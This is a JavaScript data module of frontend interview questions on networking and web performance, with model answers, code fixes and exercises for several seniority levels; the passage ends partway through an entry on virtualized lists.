export default {
  'Generic Questions': {
    'Networking (Fetch API or others)': {
      junior: [
        {
          q: `What is the difference between GET and POST? What does "idempotent" mean?`,
          short: `GET reads a resource and should have no side effects; POST submits data that usually creates or changes something. Idempotent means repeating the request gives the same server state as sending it once.`,
          long: `GET puts parameters in the URL, can be cached and bookmarked, and should not change state.\nPOST sends a body, is not cached by default and is not idempotent: two POSTs may create two orders.\nPUT and DELETE are idempotent: replacing or deleting twice ends in the same state.\nPATCH is not guaranteed idempotent (e.g. "increment by 1").\nSafe methods (GET, HEAD, OPTIONS) never change state, so browsers and proxies may retry or prefetch them.\nThis matters for retries: automatically retry idempotent requests, but use an idempotency key before retrying a POST.`,
          follow: `How can you make a payment POST request safe to retry?`,
          exercises: [
            {
              task: `Sort HTTP methods into safe and idempotent groups.`,
              description: `Checks understanding of safe vs idempotent. Write the answer in a table, no code needed.`,
              answer: `GET, HEAD, OPTIONS are safe and idempotent. PUT and DELETE are idempotent but not safe. POST and PATCH are neither by default. Only idempotent requests should be retried automatically without extra protection.`,
            },
            {
              task: `Find the bug in this delete link.`,
              description: `Checks that GET must not change state. Read the snippet and explain; run nothing.`,
              code: `<a href="/api/items/42/delete">Delete</a>`,
              answer: `A GET that deletes data can be triggered by prefetchers, crawlers, link previews or an img tag on another site (CSRF). Use a DELETE (or POST) request from a button with CSRF protection instead.`,
              solution: `<button onclick="fetch('/api/items/42', { method: 'DELETE' })">Delete</button>`,
            },
          ],
        },
        {
          q: `This code sends JSON with fetch. The server gets nothing. How do you fix it?`,
          code: `fetch('/api/users', {
  method: 'POST',
  body: { name: 'Ann' },
}).then((res) => res.json());`,
          short: `fetch does not serialize objects: the body must be a string (JSON.stringify) and the Content-Type header must say application/json. Also check res.ok before parsing.`,
          long: `Passing an object as body makes fetch call toString(), sending "[object Object]".\nWithout Content-Type: application/json most servers will not parse the body as JSON.\nfetch only rejects on network errors, so a 400/500 still resolves; check res.ok.\nres.json() throws on an empty body (e.g. 204), so guard for that.\nAlways handle errors with catch or try/await.\nThis is the most common fetch mistake for people coming from axios, which serializes automatically.`,
          fix: `const res = await fetch('/api/users', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'Ann' }),
});
if (!res.ok) throw new Error(\`HTTP \${res.status}\`);
const user = res.status === 204 ? null : await res.json();`,
          exercises: [
            {
              task: `Send form data with fetch. Fix the header problem.`,
              description: `Checks knowing when NOT to set Content-Type. Run in the browser console on any page with a form.`,
              code: `const fd = new FormData(document.querySelector('form'));
fetch('/upload', { method: 'POST', body: fd, headers: { 'Content-Type': 'multipart/form-data' } });`,
              answer: `Remove the manual Content-Type header. With FormData the browser must set multipart/form-data itself including the boundary parameter; setting it by hand drops the boundary and the server cannot parse the parts.`,
              solution: `fetch('/upload', { method: 'POST', body: fd });`,
            },
            {
              task: `Write a small helper that gets JSON and handles errors.`,
              description: `Checks error handling. Implement and test with node (Node 22 has global fetch) against https://httpbin.org/status/404.`,
              answer: `The helper should await fetch, throw an Error containing the status when !res.ok, and return res.json() otherwise. Calling it against a 404 URL should reject, proving HTTP errors are not silently treated as success.`,
              solution: `async function getJson(url, init) {
  const res = await fetch(url, init);
  if (!res.ok) throw new Error(\`HTTP \${res.status} for \${url}\`);
  return res.json();
}`,
            },
          ],
        },
        {
          q: `What are HTTP headers? Name some request and response headers you use often.`,
          short: `Headers are key-value metadata sent with requests and responses. Common ones: Content-Type, Accept, Authorization, Cache-Control, Set-Cookie, ETag.`,
          long: `Request: Accept (what format I want), Content-Type (what I am sending), Authorization (credentials/token), Cookie (sent automatically), If-None-Match (conditional request).\nResponse: Content-Type, Cache-Control (how long to cache), ETag/Last-Modified (validators), Set-Cookie, Location (redirects).\nCORS uses Access-Control-Allow-Origin and friends.\nSecurity headers: Content-Security-Policy, Strict-Transport-Security.\nIn JS you read them with res.headers.get('content-type'); cross-origin, only CORS-safelisted or exposed headers are readable.\nDevTools Network tab shows all headers for debugging.`,
          exercises: [
            {
              task: `Look at headers in DevTools. Explain three of them.`,
              description: `Checks practical debugging. Open any site, Network tab, click the document request and list 3 response headers and their meaning.`,
              answer: `Typical findings: content-type text/html; cache-control describing caching; strict-transport-security forcing HTTPS. The candidate should explain each and note that request headers like accept and user-agent are shown in a separate section.`,
            },
            {
              task: `Why can JavaScript not read a custom header from another domain?`,
              description: `Checks Access-Control-Expose-Headers. Reason about why res.headers.get('X-Total-Count') returns null on a cross-origin API.`,
              answer: `Cross-origin responses only expose CORS-safelisted headers to JS. The server must send Access-Control-Expose-Headers: X-Total-Count for the browser to make it readable. The header is still visible in DevTools, which confuses people.`,
            },
          ],
        },
      ],
      middle: [
        {
          q: `How does HTTP caching work? How do you cache JS bundle files and the index HTML file?`,
          short: `Cache-Control sets freshness; when stale, the browser revalidates with If-None-Match/ETag and may get a 304. Hashed assets get long immutable caching; index.html gets no-cache so it always revalidates.`,
          long: `max-age=N: fresh for N seconds, served without a request.\nno-cache: may store, but must revalidate every time; no-store: never store.\nETag + If-None-Match (or Last-Modified + If-Modified-Since) enable cheap 304 responses.\nimmutable tells the browser not to revalidate even on reload.\nFingerprinted files (app.3f9a.js): Cache-Control: public, max-age=31536000, immutable.\nindex.html: Cache-Control: no-cache so new deployments are picked up and point to new hashes.\nAPI data: often private, short max-age or stale-while-revalidate; CDN uses s-maxage.`,
          follow: `What does "stale while revalidate" do?`,
          exercises: [
            {
              task: `Choose cache headers for four files.`,
              description: `Checks cache policy design. Write Cache-Control values for: logo.abc123.svg, index.html, /api/me, /api/countries.`,
              answer: `logo.abc123.svg: public, max-age=31536000, immutable. index.html: no-cache. /api/me: private, no-store or no-cache since it is user-specific. /api/countries: public, max-age=3600, stale-while-revalidate=86400 because it rarely changes.`,
            },
            {
              task: `Get a 304 response with curl.`,
              description: `Checks revalidation. Run: curl -I https://example.com then curl -I -H 'If-None-Match: <etag>' https://example.com.`,
              answer: `The first response returns an ETag. Sending it back in If-None-Match returns 304 Not Modified with no body if unchanged, saving bandwidth while still costing a round trip.`,
            },
          ],
        },
        {
          q: `This code sends a form with a file as JSON. The server gets no file. Fix it.`,
          code: `const body = JSON.stringify({ name: nameInput.value, file: fileInput.files[0] });
await fetch('/api/upload', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body,
});`,
          short: `A File cannot be turned into JSON; it becomes an empty object. Send FormData and let the browser set the multipart Content-Type.`,
          long: `JSON.stringify on a File gives {}, so the file data is lost.
FormData builds a multipart/form-data body that can carry files and text fields.
Do not set Content-Type yourself: the browser must add the boundary string.
fetch has no upload progress events; use XMLHttpRequest upload.onprogress if you need a progress bar.
For very large files, consider chunked or direct-to-storage uploads with signed URLs.
Strong answer: fixes the body, knows the Content-Type trap and the progress limitation.`,
          fix: `const form = new FormData();
form.append('name', nameInput.value);
form.append('file', fileInput.files[0]);
await fetch('/api/upload', { method: 'POST', body: form });`,
          follow: `Why should you not set the Content-Type header with FormData?`,
          exercises: [
            {
              task: `The user must see upload progress. What do you use?`,
              description: `Checks knowledge of fetch limits.`,
              answer: `Use XMLHttpRequest and listen to xhr.upload.onprogress, because fetch does not give upload progress in browsers today.`,
            },
            {
              task: `Check the file before upload: max 5 MB and only PDF.`,
              description: `Checks client-side validation (the server must still check).`,
              answer: `Check file.size and file.type before sending, show an error, and still validate on the server because the client can be bypassed.`,
              solution: `const f = fileInput.files[0];
if (f.size > 5 * 1024 * 1024) throw new Error('Max 5 MB');
if (f.type !== 'application/pdf') throw new Error('Only PDF');`,
            },
          ],
        },
        {
          q: `What is rate limiting? How should the frontend handle a 429 response?`,
          short: `The server limits how many requests a client can send. On 429, stop, wait for the Retry-After time, then retry with backoff, and reduce requests in the first place.`,
          long: `429 Too Many Requests means the client went over a limit.
The response often has a Retry-After header in seconds or as a date.
The frontend should not retry at once; wait for Retry-After, or use exponential backoff with jitter.
Show a calm message if the user must wait.
Prevent it: debounce search, cache results, avoid duplicate requests, and batch calls.
Strong answer: reads Retry-After, uses backoff with jitter and talks about reducing traffic.`,
          follow: `Why do you add random jitter to the retry delay?`,
          exercises: [
            {
              task: `Write a helper that retries once after the Retry-After time on 429.`,
              description: `Checks reading headers and waiting.`,
              answer: `If status is 429, read Retry-After, wait that many seconds (with a sane default and maximum), then retry once.`,
              solution: `async function fetchWithRateLimit(url, opts) {
  const res = await fetch(url, opts);
  if (res.status !== 429) return res;
  const sec = Math.min(Number(res.headers.get('Retry-After')) || 1, 30);
  await new Promise((r) => setTimeout(r, sec * 1000));
  return fetch(url, opts);
}`,
            },
            {
              task: `A thousand clients all retry after exactly 2 seconds. What happens?`,
              description: `Checks the thundering herd problem.`,
              answer: `They all hit the server at the same moment again and get limited again. Add random jitter so retries spread out.`,
            },
          ],
        },
      ],
      senior: [
        {
          q: `Explain HTTP 2 and HTTP 3. How do they change the way we optimize the frontend?`,
          short: `HTTP/2 multiplexes many requests over one TCP connection, making sharding harmful and reducing the need for heavy concatenation; HTTP/3 runs on QUIC (UDP), removing TCP head-of-line blocking and speeding up connection setup.`,
          long: `HTTP/1.1 allowed ~6 connections per origin, so we sprited, concatenated and sharded domains.\nHTTP/2: binary framing, multiplexing, HPACK header compression; one connection per origin.\nDomain sharding now hurts: extra DNS/TLS handshakes and broken prioritization.\nTCP head-of-line blocking remains in HTTP/2: one lost packet stalls all streams.\nHTTP/3 over QUIC: per-stream loss recovery, 1-RTT (0-RTT resumption) handshakes, connection migration on network change.\nBundling still matters for compression ratio and fewer module-graph waterfalls, but granular chunks cache better.\nServer Push is dead (removed in Chrome); use 103 Early Hints and preload instead.`,
          ai: true,
          exercises: [
            {
              task: `Check which HTTP version a site uses.`,
              description: `Checks tooling. In DevTools Network enable the Protocol column; or run curl --http3 -I https://cloudflare.com (curl built with HTTP/3).`,
              answer: `The Protocol column shows h2 or h3 per request. A site on h2 that still shards assets across static1/static2 domains should consolidate them to reuse a single connection.`,
            },
            {
              task: `Start loading CSS before a slow server sends the HTML.`,
              description: `Checks modern hints. Propose how to start loading critical CSS before the HTML is generated by a slow SSR server.`,
              answer: `Send a 103 Early Hints response with Link: </app.css>; rel=preload; as=style (and preconnect for API/CDN origins) while the server renders. Browsers start fetching immediately, then the final 200 arrives with the HTML.`,
            },
          ],
        },
        {
          q: `This code refreshes the token many times at once. Fix it so it refreshes only once.`,
          code: `async function api(url, init) {
  let res = await fetch(url, withToken(init));
  if (res.status === 401) {
    await refreshToken();
    res = await fetch(url, withToken(init));
  }
  return res;
}`,
          short: `Deduplicate refreshes with a single shared in-flight promise, retry each failed request once after it settles, and log out if the refresh itself fails.`,
          long: `When 10 requests get 401 at once, each calls refreshToken: 10 refreshes, and with rotating refresh tokens 9 of them fail.\nStore one refresh promise; concurrent callers await the same one.\nClear it in finally so a later expiry can refresh again.\nRetry only once to avoid infinite loops; if refresh fails, clear session and redirect to login.\nRequest bodies that are streams cannot be replayed; clone or rebuild init.\nAlso consider proactive refresh before expiry and cross-tab coordination (BroadcastChannel or Web Locks).`,
          fix: `let refreshing = null;
function refreshOnce() {
  refreshing ??= refreshToken().finally(() => { refreshing = null; });
  return refreshing;
}
async function api(url, init, retried = false) {
  const res = await fetch(url, withToken(init));
  if (res.status !== 401 || retried) return res;
  try {
    await refreshOnce();
  } catch (e) {
    logout();
    throw e;
  }
  return api(url, init, true);
}`,
          exercises: [
            {
              task: `Test that five parallel calls refresh only once.`,
              description: `Checks dedupe. In Vitest, mock fetch to return 401 then 200, fire 5 api() calls with Promise.all and assert refreshToken was called once.`,
              answer: `With the shared promise refreshToken is called exactly once and all 5 calls resolve with 200. Without it the spy records 5 calls, demonstrating the stampede.`,
            },
            {
              task: `Stop two browser tabs from refreshing at the same time.`,
              description: `Checks Web Locks API. Sketch how two open tabs avoid refreshing simultaneously.`,
              answer: `Wrap refresh in navigator.locks.request('token-refresh', async () => {...}). Inside, re-check whether another tab already stored a fresh token (e.g. via BroadcastChannel or storage) before calling the server, so only one tab rotates the refresh token.`,
            },
          ],
        },
        {
          q: `How do you design a strong API client for a large app? Think about errors, retries, types and logging.`,
          short: `One typed client wrapping fetch with consistent error types, timeouts, idempotent-only retries with backoff and jitter, auth handling, request IDs for tracing, and a server-state cache like TanStack Query on top.`,
          long: `Single entry point: base URL, headers, JSON handling, auth refresh; components never call fetch directly.\nNormalize errors into typed classes (NetworkError, HttpError with status and problem+json body, TimeoutError, AbortError).\nTimeouts via AbortSignal.timeout; retries only for idempotent methods and 408/429/5xx, honoring Retry-After, with jittered exponential backoff.\nValidate responses at the boundary (zod or generated types from OpenAPI).\nSend a traceparent/X-Request-Id header and report failures with that ID to Sentry/OpenTelemetry.\nCaching, dedupe and invalidation belong to TanStack Query rather than hand-rolled caches.\nCircuit-breaker or graceful degradation for non-critical widgets.`,
          ai: true,
          exercises: [
            {
              task: `Write a retry delay function with random jitter.`,
              description: `Checks backoff math. Write a function delay(attempt) using full jitter, base 300ms, cap 10s; test with node printing 6 attempts.`,
              answer: `Full jitter: Math.random() * Math.min(cap, base * 2 ** attempt). Randomness spreads clients so they do not retry in sync after an outage (thundering herd). Values grow on average but stay under the cap.`,
              solution: `const delay = (n, base = 300, cap = 10000) => Math.random() * Math.min(cap, base * 2 ** n);`,
            },
            {
              task: `Check the shape of an API response with zod.`,
              description: `Checks boundary validation. Parse a /api/user response and turn a schema mismatch into a typed error; run via vitest.`,
              answer: `Define UserSchema, call UserSchema.safeParse(json) and throw a ContractError with the issues when it fails. This turns silent undefined bugs deep in the UI into one clear, reportable error at the API edge.`,
            },
          ],
        },
      ],
      techlead: [
        {
          q: `Frontend and backend teams often break the API for each other. What process and tools do you add?`,
          short: `Make the contract a versioned artifact (OpenAPI/GraphQL schema), generate typed clients, check breaking changes in CI, and use consumer-driven or contract tests plus deprecation policies.`,
          long: `Schema-first or code-first with the schema exported and committed; it is the source of truth.\nGenerate the TS client (openapi-typescript, orval) so drift becomes a compile error.\nCI runs a breaking-change diff (oasdiff, graphql-inspector) on every backend PR and blocks or requires a label.\nContract tests (Pact) for critical consumer flows; MSW mocks generated from the same schema.\nAdditive changes only; removals follow a deprecation window with usage telemetry.\nShared ownership: API review guild, changelog, and a named owner per endpoint.\nMeasure: number of contract incidents per quarter.`,
          ai: true,
          exercises: [
            {
              task: `Add a CI step that fails on breaking API changes.`,
              description: `Checks CI design. Write a GitHub Actions step that fails when openapi.yaml changes break compatibility with master.`,
              code: `- run: git fetch origin master --depth=1
- run: git show origin/master:openapi.yaml > base.yaml`,
              answer: `Add a step running oasdiff breaking base.yaml openapi.yaml --fail-on ERR. The job fails on removed fields, changed types or new required params, forcing a deliberate version bump or deprecation instead of a surprise breakage.`,
              solution: `- run: docker run --rm -v "$PWD:/w" tufin/oasdiff breaking /w/base.yaml /w/openapi.yaml --fail-on ERR`,
            },
            {
              task: `Write rules for removing an old API field.`,
              description: `Checks governance. Draft 4-5 rules for deprecating an endpoint field.`,
              answer: `Announce in the changelog and mark deprecated in the schema; emit a Deprecation/Sunset header; track field usage via telemetry; give a fixed window (e.g. 2 releases or 90 days); remove only when usage is zero or consumers sign off.`,
            },
          ],
        },
        {
          q: `Users on slow mobile networks say the app does not work. How do you lead the work to fix it?`,
          short: `Get field data (RUM) segmented by region/connection, find the dominant cost (latency, payload, request waterfalls), then fix with CDN/edge, fewer round trips, smaller payloads and offline-tolerant UX, tracking agreed targets.`,
          long: `Start with data: RUM (web-vitals, Navigation/Resource Timing) sliced by country, effectiveType and device.\nReproduce with DevTools throttling and real devices or WebPageTest from those regions.\nTypical causes: far origin with no CDN, chatty APIs (waterfalls), large JSON, no compression, blocking JS.\nFixes span teams: CDN and edge caching (infra), aggregated endpoints/BFF and Brotli (backend), code splitting and prefetch (frontend).\nUX: skeletons, optimistic UI, retries, offline queue for mutations.\nSet SLOs (p75 LCP and API latency per region) and review them monthly.\nCommunicate trade-offs and sequence by impact and effort.`,
          ai: true,
          exercises: [
            {
              task: `Send page speed data together with the network type.`,
              description: `Checks instrumentation. Write a snippet that sends LCP plus navigator.connection.effectiveType to /rum using the web-vitals library.`,
              answer: `Use onLCP(metric => navigator.sendBeacon('/rum', JSON.stringify({ v: metric.value, net: navigator.connection?.effectiveType }))). sendBeacon survives page unload; the optional chaining handles browsers (Safari, Firefox) without the Network Information API.`,
            },
            {
              task: `Put these three fixes in order and explain why.`,
              description: `Checks leadership trade-offs. Given: no CDN, 12 sequential API calls, 900KB JS. Order the work and justify in 4 sentences.`,
              answer: `Add CDN/compression first: cheap, infra-only, benefits everything. Then collapse the API waterfall, since each round trip on high-latency links costs hundreds of ms. Then split the JS bundle. Measure after each step to confirm the effect.`,
            },
          ],
        },
        {
          q: `Would you add a backend for frontend, or BFF? What are the pros and cons? Who owns it?`,
          short: `A BFF is a frontend-owned server layer that aggregates and shapes APIs, holds tokens and caches; it reduces client complexity and round trips but adds a service the frontend team must operate.`,
          long: `Benefits: aggregate many microservice calls into one, tailor payloads, keep tokens server-side (more secure than tokens in JS), centralize caching and feature flags.\nIt enables SSR and edge rendering frameworks (Next.js route handlers, Remix loaders) naturally.\nCosts: on-call, scaling, observability, latency of an extra hop, duplicated business logic risk.\nRule: the BFF does composition and presentation, never core domain rules.\nOwnership: frontend team owns it with SRE support and the same CI/CD standards.\nAlternatives: GraphQL gateway, or improving backend endpoints directly.\nDecide by pain: number of calls per screen, auth security requirements, team skills.`,
          ai: true,
          exercises: [
            {
              task: `List the parts of a decision record for adding a BFF.`,
              description: `Checks decision documentation. List the sections and key points of an ADR proposing a BFF.`,
              answer: `Context (call counts, latency, auth risk), Decision (Node 22/24 BFF owned by web team), Alternatives (GraphQL gateway, backend changes), Consequences (on-call, cost, security gain), and success metrics. Keep it short and link to data.`,
            },
            {
              task: `The BFF checks if an applicant is eligible. What is wrong?`,
              description: `Checks boundaries. A BFF endpoint calculates applicant eligibility rules.`,
              answer: `Domain rules in the BFF get duplicated or diverge from the backend and other clients (mobile, integrations). Eligibility should stay in the domain service; the BFF should only fetch and shape the result.`,
            },
          ],
        },
      ],
    },

    Performance: {
      junior: [
        {
          q: `What is lazy loading? How do you lazy load images and pages?`,
          short: `Lazy loading delays loading of resources until they are needed. Use loading="lazy" on below-the-fold images and dynamic import() / React.lazy for routes.`,
          long: `Images: <img loading="lazy" width height> lets the browser defer offscreen images.\nNever lazy-load the LCP (hero) image; it delays the main content.\nAlways set width/height or aspect-ratio to avoid layout shift (CLS).\nRoutes: const Page = lazy(() => import('./Page')) inside <Suspense> creates a separate chunk.\nBundlers (Vite, webpack) split on dynamic import automatically.\niframes also support loading="lazy".`,
          exercises: [
            {
              task: `Fix the main image on the page.`,
              description: `Checks LCP awareness. Review and correct the markup; verify LCP in Lighthouse.`,
              code: `<img src="hero.jpg" loading="lazy">`,
              answer: `The hero is the LCP element, so lazy loading delays it. Remove loading="lazy", add fetchpriority="high" and explicit width/height so the browser fetches it early without layout shift.`,
              solution: `<img src="hero.jpg" width="1200" height="600" fetchpriority="high" alt="...">`,
            },
            {
              task: `Make the Settings page load only when needed.`,
              description: `Checks code splitting. Convert a static import of Settings page to lazy; run npm run build and confirm a new chunk.`,
              answer: `Use const Settings = lazy(() => import('./Settings')) and wrap the route element in Suspense with a fallback. The build output shows a separate Settings-[hash].js chunk loaded only when the route is visited.`,
            },
          ],
        },
        {
          q: `Why does this loop freeze the page? How do you fix it?`,
          code: `const items = document.querySelectorAll('.item');
items.forEach((el) => {
  el.style.width = el.parentNode.offsetWidth / 2 + 'px';
});`,
          short: `Reading layout (offsetWidth) after each style write forces a synchronous reflow every iteration (layout thrashing). Batch reads first, then writes.`,
          long: `The browser normally batches style changes and computes layout once per frame.\nReading offsetWidth/getBoundingClientRect after a write forces immediate layout.\nInterleaving read-write in a loop causes N forced layouts.\nFix: read all values into an array, then apply all writes.\nOr use CSS (width: 50%) and avoid JS entirely.\nDevTools Performance panel shows purple "Layout" blocks with "Forced reflow" warnings.`,
          fix: `const items = [...document.querySelectorAll('.item')];
const widths = items.map((el) => el.parentNode.offsetWidth); // reads
items.forEach((el, i) => { el.style.width = widths[i] / 2 + 'px'; }); // writes
// Better: .item { width: 50%; }`,
          exercises: [
            {
              task: `Find forced layout work in DevTools.`,
              description: `Checks DevTools usage. Record the original loop in the Performance panel with 1,000 items and describe what you see.`,
              answer: `Many purple Layout events appear inside the script task, flagged with a "Forced reflow is a likely performance bottleneck" warning. After batching there is one layout and the task is much shorter.`,
            },
            {
              task: `Update styles on scroll only once per frame.`,
              description: `Checks frame scheduling. Rewrite a scroll handler that writes styles using requestAnimationFrame.`,
              answer: `Store the latest scroll position in the handler and schedule a single requestAnimationFrame that applies styles if one is not already pending. This caps work at one write per frame and avoids running heavy code for every scroll event.`,
            },
          ],
        },
        {
          q: `What is the critical rendering path? What blocks the first paint?`,
          short: `The browser must build the DOM and CSSOM, combine them into a render tree, then layout and paint. CSS in the head and synchronous scripts block the first paint.`,
          long: `The critical rendering path is the work between receiving HTML and showing pixels.
Steps: parse HTML into the DOM, parse CSS into the CSSOM, build the render tree, run layout, then paint and composite.
CSS is render-blocking: the browser will not paint until stylesheets in the head are loaded.
Classic scripts without defer or async are parser-blocking: HTML parsing stops while they download and run.
Fixes: inline small critical CSS, defer non-critical JS, avoid long chains of imports, keep the HTML small, preconnect to important origins.
Strong answer: names render-blocking vs parser-blocking resources and how to see them in the DevTools Performance panel or Lighthouse.
Weak answer: "the page is slow because of big images".`,
          follow: `Why does a font file sometimes delay text even when CSS is loaded?`,
          exercises: [
            {
              task: `Which resources here block the first paint?`,
              description: `Checks render-blocking vs parser-blocking. Show the head and ask the candidate to mark each line.`,
              code: `<head>
  <link rel="stylesheet" href="/main.css">
  <link rel="stylesheet" href="/print.css" media="print">
  <script src="/analytics.js"></script>
  <script src="/app.js" defer></script>
</head>`,
              answer: `main.css blocks rendering. print.css does not block screen rendering because of media="print". analytics.js blocks parsing (no defer or async). app.js with defer does not block. Fix: add async or defer to analytics.js.`,
            },
            {
              task: `Explain how you would find render-blocking resources on a real page.`,
              description: `Checks tool knowledge. Let the candidate describe the steps in DevTools or Lighthouse.`,
              answer: `Run Lighthouse and read the "Eliminate render-blocking resources" audit, or record a load in the Performance panel and look at what loads before First Contentful Paint. The Network panel can also show the "Render blocking" column in Chrome.`,
            },
          ],
        },
      ],
      middle: [
        {
          q: `This code reads the layout inside a loop. The page stutters. Fix it.`,
          code: `for (const el of cards) {
  const h = el.offsetHeight;
  el.style.height = h + 10 + 'px';
}`,
          short: `Each read after a write forces the browser to recalculate layout. Do all reads first, then all writes.`,
          long: `This is called layout thrashing, or forced synchronous layout.
Writing a style makes the layout dirty. Reading offsetHeight then forces the browser to calculate layout right now.
In a loop this happens once per element, so a cheap job becomes very slow.
Fix: batch reads, then batch writes. For animation, do writes in requestAnimationFrame.
DevTools shows this as purple "Layout" blocks with a "Forced reflow" warning.
Strong answer: explains read/write batching and how to spot it in the Performance panel.`,
          fix: `const heights = cards.map((el) => el.offsetHeight);
cards.forEach((el, i) => { el.style.height = heights[i] + 10 + 'px'; });`,
          follow: `Which properties force a layout when you read them?`,
          exercises: [
            {
              task: `Name four properties or methods that force layout when read.`,
              description: `Checks practical knowledge. Accept any four.`,
              answer: `For example: offsetWidth/offsetHeight, clientWidth, scrollTop, getBoundingClientRect, getComputedStyle, innerText.`,
            },
            {
              task: `How would you confirm the fix worked?`,
              description: `Checks measuring before and after.`,
              answer: `Record the interaction in the Performance panel before and after. The many small "Layout" blocks with forced reflow warnings should become one layout, and the task time should drop.`,
            },
          ],
        },
        {
          q: `How does font loading affect page speed? What do font-display and font subsetting do?`,
          short: `Web fonts can hide text or make it jump. font-display controls what shows while the font loads, and subsetting makes the files smaller.`,
          long: `Fonts are found late: the browser downloads them only after CSS is parsed and text needs them.
Without a rule, browsers may hide text for up to 3 seconds (flash of invisible text).
font-display: swap shows a fallback font at once and swaps later; optional uses the web font only if it is ready very fast.
Swapping can cause layout shift, so match fallback metrics with size-adjust and ascent-override.
Make files small: use woff2, subset to the needed characters (unicode-range), and use variable fonts instead of many weights.
Preload only the one or two most important font files.
Strong answer: covers invisible text, layout shift, subsetting and preload.`,
          follow: `Why can preloading too many fonts make the page slower?`,
          exercises: [
            {
              task: `Write a font-face rule that shows text at once and loads only Latin characters.`,
              description: `Checks font-display and unicode-range.`,
              answer: `Use woff2, font-display: swap and a unicode-range for Latin.`,
              solution: `@font-face {
  font-family: 'Brand';
  src: url('/fonts/brand-latin.woff2') format('woff2');
  font-display: swap;
  unicode-range: U+0000-00FF;
}`,
            },
            {
              task: `After adding swap, the page jumps when the font loads. Why? What can you do?`,
              description: `Checks the CLS trade-off.`,
              answer: `The fallback font has different sizes, so text reflows when the web font arrives. Tune the fallback with size-adjust and ascent-override, or use font-display: optional.`,
            },
          ],
        },
        {
          q: `Explain resource hints: preload, prefetch, preconnect, and fetch priority. When do you use each?`,
          short: `preconnect warms connections to origins; preload fetches critical current-page resources early; prefetch fetches likely next-page resources at low priority; modulepreload preloads ES modules; fetchpriority adjusts priority.`,
          long: `preconnect: DNS+TCP+TLS for critical third-party origins (fonts, API); limit to a few.\ndns-prefetch: cheaper fallback, DNS only.\npreload (as=font/style/image): high-priority fetch of late-discovered critical resources; fonts need crossorigin.\nUnused preloads waste bandwidth and Chrome warns about them.\nprefetch: idle-time fetch for future navigations; Speculation Rules API can prerender whole pages.\nmodulepreload: fetches and parses module dependencies (Vite injects this).\nfetchpriority="high|low" on img/link/script fine-tunes order, e.g. the LCP image.`,
          exercises: [
            {
              task: `Load a web font early and correctly.`,
              description: `Checks preload correctness. Write the head tags for a self-hosted Inter woff2 used above the fold.`,
              answer: `<link rel="preload" href="/fonts/inter.woff2" as="font" type="font/woff2" crossorigin> plus @font-face with font-display: swap. Without crossorigin the preload is not reused and the font downloads twice.`,
            },
            {
              task: `Load the checkout page in advance when the user hovers its link.`,
              description: `Checks Speculation Rules (Chromium). Write the rule.`,
              answer: `Add <script type="speculationrules">{"prerender":[{"where":{"href_matches":"/checkout"},"eagerness":"moderate"}]}</script>. Moderate eagerness triggers on hover, making navigation near-instant; unsupported browsers ignore it.`,
            },
          ],
        },
      ],
      senior: [
        {
          q: `These imports make the bundle too big. Find the problem and fix it.`,
          code: `import _ from 'lodash';
import * as Icons from '@mui/icons-material';
import moment from 'moment';
export const fmt = (d) => moment(d).format('YYYY-MM-DD');
export const uniq = (a) => _.uniq(a);
export const Logo = () => <Icons.Home />;`,
          short: `These imports pull whole libraries into the bundle (lodash CJS, all MUI icons, moment with locales). Use per-function ESM imports, deep icon imports and a lighter date lib or Intl.`,
          long: `lodash (CJS) is not tree-shakeable; use lodash-es or native code (new Set).\nNamespace import of @mui/icons-material can force processing thousands of modules; import from '@mui/icons-material/Home'.\nmoment is large and mutable and in maintenance mode; use date-fns, dayjs or Intl.DateTimeFormat.\nCheck with rollup-plugin-visualizer or vite-bundle-analyzer.\nAdd a bundle size budget in CI (size-limit) to prevent regressions.\nAlso watch for sideEffects flags and barrel files that defeat tree-shaking.`,
          fix: `import HomeIcon from '@mui/icons-material/Home';
export const fmt = (d) => new Date(d).toISOString().slice(0, 10);
export const uniq = (a) => [...new Set(a)];
export const Logo = () => <HomeIcon />;`,
          exercises: [
            {
              task: `Look at the bundle as a picture.`,
              description: `Checks analysis tools. Add rollup-plugin-visualizer to vite.config and run npm run build.`,
              answer: `The generated stats.html treemap shows lodash, moment locales and icons as large blocks. After the fix those blocks disappear or shrink, and the gzip size reported by Vite drops.`,
            },
            {
              task: `Add a size limit for the bundle in CI.`,
              description: `Checks regression prevention. Configure size-limit for dist/assets/index-*.js at 150 kB and run npx size-limit.`,
              answer: `Add a .size-limit.json with path and limit, run it in CI; the job fails when the bundle exceeds the budget. The PR comment action shows diffs so authors see the impact of new dependencies.`,
              solution: `[{ "path": "dist/assets/index-*.js", "limit": "150 kB" }]`,
            },
          ],
        },
        {
          q: `Lighthouse scores are good, but real user data is bad. Why? What do you do?`,
          short: `Lighthouse runs one synthetic load on a fast machine with no user interaction or cache variety; field data reflects real devices, networks, interactions and full sessions at p75. Trust field data and use RUM to find the gap.`,
          long: `Lab: single device profile, cold load, no logged-in state, no interactions, so INP is not measured.\nField: p75 over 28 days across low-end Android, slow networks, real content and third parties.\nCLS in the field accumulates during the session (late ads, infinite scroll).\nLCP differs with personalized content, A/B scripts, consent banners.\nCollect RUM with web-vitals attribution, segment by page type, device and country.\nReproduce the worst segment in the lab with matching throttling and auth.\nTrack field p75 as the KPI; Lighthouse CI is only a regression guard.`,
          ai: true,
          exercises: [
            {
              task: `Get real user data for your site from Chrome data.`,
              description: `Checks field data access. Use the CrUX API or PageSpeed Insights for your origin and report p75 LCP/INP/CLS by form factor.`,
              answer: `PSI shows origin and URL-level field data split by mobile/desktop. Typically mobile is much worse; the candidate should identify which metric fails and which URL group drives it.`,
            },
            {
              task: `Layout shift is low in the lab but high for users. Give three reasons.`,
              description: `Checks reasoning. Lighthouse CLS 0.01, field CLS 0.3.`,
              answer: `Cookie/consent banner injected late for real users, ads or embeds without reserved space, and layout shifts after interactions or lazy content during scroll. None appear in a short synthetic load.`,
            },
          ],
        },
        {
          q: `How do you show one hundred thousand rows smoothly? What are the downsides of virtual lists?`,
          short: `Virtualize: render only visible rows plus overscan inside a scroll container with spacer height. Trade-offs: find-in-page, accessibility, variable heights and scroll restoration get harder.`,
